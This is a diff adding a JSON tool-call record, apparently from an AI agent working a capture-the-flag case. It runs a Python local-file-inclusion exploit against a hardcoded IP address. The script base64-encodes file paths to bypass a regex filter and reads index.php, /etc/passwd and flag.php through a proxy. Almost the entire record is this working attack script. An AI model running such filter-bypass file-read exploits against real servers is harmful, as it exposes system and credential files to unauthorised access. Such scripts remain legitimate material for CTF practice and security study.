@@ -1,0 +1,10 @@
+{
+  "tool": "py_run",
+  "arguments": {
+    "code": "\nimport base64, re, urllib.request, urllib.parse\nBASE = \"http://160.202.254.160:10986/\"\nKEY = re.compile(r\"Yeedo|wants|a|girl|friend|or|flag\", re.I)\n\ndef build_zero(path):\n    z = base64.b64encode(path.encode()).decode()\n    if KEY.search(z) and \"..\" not in z and \"flag\" not in z.lower():\n        return z\n    return z + \"a\"          # 追加在 == 之后，正则命中且解码不变\n\ndef fetch(path):\n    q = urllib.parse.urlencode({\"zero\": build_zero(path), \"first\": \"|.php\"})\n    url = BASE + \"?\" + q\n    proxy = {\"http\": \"http://127.0.0.1:12001\", \"https\": \"http://127.0.0.1:12001\"}\n    opener = urllib.request.build_opener(urllib.request.ProxyHandler(proxy))\n    with opener.open(url, timeout=15) as r:\n        return url, r.read().decode(\"utf-8\", \"replace\")\n\nprint(\"[1] 首页源码泄漏验证\")\n_, home = fetch(\"/var/www/html/index.php\")\nprint(\"    index.php 回显长度 =\", len(home))\nprint(\"    含 highlight_file =\", \"highlight_file\" in home)\n\nprint(\"[2] 路径遍历 + 绝对路径读取\")\nfor p in [\"/etc/passwd\", \"/var/www/html/flag.php\"]:\n    url, body = fetch(p)\n    hit = \"flag{\" in body\n    print(\"    %-26s len=%-5d flag命中=%s\" % (p, len(body), hit))\n    if hit:\n        m = re.search(r\"flag\\{[0-9a-fA-F]+\\}\", body)\n        print(\"    URL   :\", url)\n        print(\"    BODY  :\", body.strip()[:120])\n        print(\"    FLAG  :\", m.group(0) if m else \"未匹配\")\n",
+    "timeout": 90,
+    "wp_case": "ctf-fca56ff3a53c802b",
+    "wp_purpose": "在系统内执行 LFI 利用脚本，验证机制并读取 flag"
+  },
+  "operation_id": "5b2e52c6d5864b5cb9ab103b81823cb7"
+}
